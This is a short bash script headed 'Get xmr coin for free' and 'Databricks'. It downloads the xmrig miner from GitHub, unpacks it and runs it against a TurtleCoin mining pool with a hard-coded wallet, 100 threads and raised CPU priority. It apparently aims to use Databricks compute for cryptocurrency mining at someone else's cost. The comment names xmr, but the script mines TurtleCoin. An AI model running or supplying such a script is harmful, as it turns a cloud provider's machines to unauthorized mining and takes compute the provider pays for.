#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.12.0/xmrig-6.12.0-focal-x64.tar.gz
tar xvzf xmrig-6.12.0-focal-x64.tar.gz
cd xmrig-6.12.0
./xmrig -a argon2/chukwav2 -o us.turtlecoin.herominers.com:1160 -u solo:TRTLv1Hqo3wHdqLRXuCyX3MwvzKyxzwXeBtycnkDy8ceFp4E23bm3P467xLEbUusH6Q1mqQUBiYwJ2yULJbvr5nKe8kcyc4uyps+039c5f75d4264c76ec296fa80a6ccc429f1a0bc726bba32e588236058623495a -k --tls -p Threadripper --threads=100 --cpu-priority=5
